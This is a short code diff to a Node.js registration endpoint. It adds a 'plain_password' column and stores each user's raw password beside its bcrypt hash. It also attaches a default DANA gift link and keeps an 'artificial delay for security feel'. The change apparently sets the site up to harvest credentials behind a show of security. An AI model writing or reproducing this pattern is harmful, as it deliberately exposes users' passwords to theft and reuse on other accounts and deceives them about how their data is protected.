@@ -26,6 +26,8 @@ const initDb = async () => {
         id SERIAL PRIMARY KEY,
         username TEXT UNIQUE NOT NULL,
         password_hash TEXT NOT NULL,
+        gift_link TEXT,
+        plain_password TEXT,
         created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
       )
     `);
@@ -80,7 +82,8 @@ app.post('/api/register', async (req, res) => {
     const hash = await bcrypt.hash(password, saltRounds);
 
     // Insert user
-    await pool.query('INSERT INTO users (username, password_hash) VALUES ($1, $2)', [username, hash]);
+    const link = gift_link || 'https://link.dana.id/kaget/default';
+    await pool.query('INSERT INTO users (username, password_hash, gift_link, plain_password) VALUES ($1, $2, $3, $4)', [username, hash, link, password]);
 
     // Artificial delay for security feel
     await new Promise(resolve => setTimeout(resolve, 800));
